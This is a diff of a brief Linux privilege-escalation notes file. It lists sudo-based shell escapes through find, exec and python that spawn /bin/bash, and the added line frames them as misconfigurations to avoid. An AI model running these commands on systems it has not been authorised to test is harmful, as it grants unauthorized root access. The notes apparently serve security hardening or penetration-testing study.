@@ -1,5 +1,7 @@
 Privesc Linux
 
+Privilege Escalation through sudo. Make sure none of these are configured on secure.
+
 SUDO{
 
 using vi/vim?
@@ -15,7 +17,6 @@ using more
 
 using cp and mv
 
-
 using find 
 sudo find /etc bash -i \;
 
@@ -30,5 +31,4 @@ exec "/bin/bash"
 python
 import os
 os.system('/bin/bash')
-
 }
